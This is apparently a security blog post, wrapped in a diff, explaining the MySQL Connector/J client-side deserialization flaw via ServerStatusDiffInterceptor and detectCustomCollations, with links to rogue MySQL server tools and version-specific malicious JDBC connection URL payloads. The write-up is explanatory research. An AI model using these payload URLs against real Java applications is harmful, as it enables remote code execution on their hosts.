@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Mysql JDBC AttackIntroductionWhen connecting to a database through JDBC, there are several steps to follow:  Import JDBC package Register JDBC Driver Establish a connection Execute the Query Close all">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MySQL JDBC Attack">
+<meta property="og:url" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/index.html">
+<meta property="og:site_name" content="P3ngu1nW">
+<meta property="og:description" content="Mysql JDBC AttackIntroductionWhen connecting to a database through JDBC, there are several steps to follow:  Import JDBC package Register JDBC Driver Establish a connection Execute the Query Close all">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/image-20230829104707555.png">
+<meta property="og:image" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/image-20230829104744767.png">
+<meta property="og:image" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/image-20230829104931444.png">
+<meta property="og:image" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/image-20230829105150881.png">
+<meta property="article:published_time" content="2023-08-29T01:50:27.000Z">
+<meta property="article:modified_time" content="2023-08-29T03:28:36.323Z">
+<meta property="article:author" content="P3ngu1nW">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/08/29/MySQL-JDBC-Attack/image-20230829104707555.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>MySQL JDBC Attack</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/08/15/SnakeYaml-Exploit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/29/MySQL-JDBC-Attack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&text=MySQL JDBC Attack"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&is_video=false&description=MySQL JDBC Attack"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MySQL JDBC Attack&body=Check out this article: http://example.com/2023/08/29/MySQL-JDBC-Attack/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&name=MySQL JDBC Attack&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/29/MySQL-JDBC-Attack/&t=MySQL JDBC Attack"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-JDBC-Attack"><span class="toc-number">1.</span> <span class="toc-text">Mysql JDBC Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.2.</span> <span class="toc-text">Code Analysing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerStatusDiffInterceptor"><span class="toc-number">1.2.1.</span> <span class="toc-text">ServerStatusDiffInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#detectCustomCollations"><span class="toc-number">1.2.2.</span> <span class="toc-text">detectCustomCollations</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools"><span class="toc-number">1.3.1.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads"><span class="toc-number">1.3.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ServerStatusDiffInterceptor-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ServerStatusDiffInterceptor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#detectCustomCollations-1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">detectCustomCollations</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        MySQL JDBC Attack
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">P3ngu1nW</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-08-29T01:50:27.000Z" class="dt-published" itemprop="datePublished">2023-08-29</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Mysql-JDBC-Attack"><a href="#Mysql-JDBC-Attack" class="headerlink" title="Mysql JDBC Attack"></a>Mysql JDBC Attack</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>When connecting to a database through JDBC, there are several steps to follow:</p>
+<ul>
+<li>Import JDBC package</li>
+<li>Register JDBC Driver</li>
+<li>Establish a connection</li>
+<li>Execute the Query</li>
+<li>Close all database resource</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JDBC_DRIVER</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASS</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line">            System.out.println(<span class="string">&quot;Connecting to database...&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(DB_URL, USER, PASS);</span><br><span class="line">            System.out.println(<span class="string">&quot;Creating database...&quot;</span>);</span><br><span class="line">            stmt = conn.createStatement();</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE DATABASE STUDENTS&quot;</span>;</span><br><span class="line">            stmt.executeUpdate(sql);</span><br><span class="line">            System.out.println(<span class="string">&quot;Database created successfully...&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(SQLException se)&#123;</span><br><span class="line">            se.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(stmt!=<span class="literal">null</span>)</span><br><span class="line">                    stmt.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SQLException se2)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(conn!=<span class="literal">null</span>)</span><br><span class="line">                    conn.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span>(SQLException se)&#123;</span><br><span class="line">                se.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Goodbye!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>When connecting to the MySQL server through JDBC, there will be several built-in SQL query statements to be executed, and the result sets of two queries will be deserialized by calling <code>ObjectInputStream.readObject()</code> when the MySQL client is processed. If an attacker builds a malicious MySQL server to control the result sets of these two queries, and the attacker can control the JDBC connection settings, then the MySQL JDBC client deserialization vulnerability can be triggered.</p>
+<h2 id="Code-Analysing"><a href="#Code-Analysing" class="headerlink" title="Code Analysing"></a>Code Analysing</h2><h3 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h3><p>When we set a <code>queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code> in the JDBC connection URL, it will call the interceptor’s <code>preProcess</code> and <code>postProcess</code> methods automatically.</p>
+<img src="/2023/08/29/MySQL-JDBC-Attack/image-20230829104707555.png" class title="image-20230829104707555">
+
+<p>Following the <code>populateMapWithSessionStatusValues</code>, we can find we execute a query: <code>SHOW SESSION STATUS</code></p>
+<img src="/2023/08/29/MySQL-JDBC-Attack/image-20230829104744767.png" class title="image-20230829104744767">
+
+<p>Following the <code>resultSetToMap</code>, we can find we call the <code>getObject</code></p>
+<img src="/2023/08/29/MySQL-JDBC-Attack/image-20230829104931444.png" class title="image-20230829104931444">
+
+<p>In <code>ResultMapImpl#getObject</code>, we deserialize a object.</p>
+<img src="/2023/08/29/MySQL-JDBC-Attack/image-20230829105150881.png" class title="image-20230829105150881">
+
+<p>So if we can control the mysql server return a evil data stream we can RCE in the client side.</p>
+<h3 id="detectCustomCollations"><a href="#detectCustomCollations" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h3><p>If this option is set to “true”, the driver will obtain the actual character set&#x2F;sorting rules from the server every time a connection is established.</p>
+<p>But it has a strict version limitation.</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p><a target="_blank" rel="noopener" href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
+<h3 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h3><h4 id="ServerStatusDiffInterceptor-1"><a href="#ServerStatusDiffInterceptor-1" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h4><ul>
+<li><p>8.x &lt;&#x3D; 8.0.20</p>
+<p><code>jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p>
+</li>
+<li><p>6.x</p>
+<p><code>queryInterceptors</code> &#x3D;&gt; <code>statementInterceptors</code></p>
+<p><code>jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</code></p>
+</li>
+<li><p>&gt;&#x3D; 5.1.11</p>
+<p>without <code>cj</code></p>
+<p><code>jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</code></p>
+</li>
+<li><p>5.x &lt;&#x3D; 5.1.10</p>
+<p>Same as the last one, but need a additional query after connection</p>
+</li>
+</ul>
+<h4 id="detectCustomCollations-1"><a href="#detectCustomCollations-1" class="headerlink" title="detectCustomCollations"></a>detectCustomCollations</h4><ul>
+<li><p>5.1.29~5.1.40</p>
+<p><code>jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</code></p>
+</li>
+<li><p>5.1.19~5.1.28</p>
+<p><code>jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true</code></p>
+</li>
+</ul>
+<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/serial-journey/mysql">https://p4d0rn.gitbook.io/java/serial-journey/mysql</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2023/01/13/MySQL-jdbc-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">https://drun1baby.top/2023/01/13/MySQL-jdbc-反序列化分析/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Mysql-JDBC-Attack"><span class="toc-number">1.</span> <span class="toc-text">Mysql JDBC Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.2.</span> <span class="toc-text">Code Analysing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ServerStatusDiffInterceptor"><span class="toc-number">1.2.1.</span> <span class="toc-text">ServerStatusDiffInterceptor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#detectCustomCollations"><span class="toc-number">1.2.2.</span> <span class="toc-text">detectCustomCollations</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.</span> <span class="toc-text">EXP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools"><span class="toc-number">1.3.1.</span> <span class="toc-text">Tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payloads"><span class="toc-number">1.3.2.</span> <span class="toc-text">Payloads</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ServerStatusDiffInterceptor-1"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">ServerStatusDiffInterceptor</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#detectCustomCollations-1"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">detectCustomCollations</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.4.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/29/MySQL-JDBC-Attack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&text=MySQL JDBC Attack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&is_video=false&description=MySQL JDBC Attack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=MySQL JDBC Attack&body=Check out this article: http://example.com/2023/08/29/MySQL-JDBC-Attack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&title=MySQL JDBC Attack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/29/MySQL-JDBC-Attack/&name=MySQL JDBC Attack&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/08/29/MySQL-JDBC-Attack/&t=MySQL JDBC Attack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023
+    P3ngu1nW
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
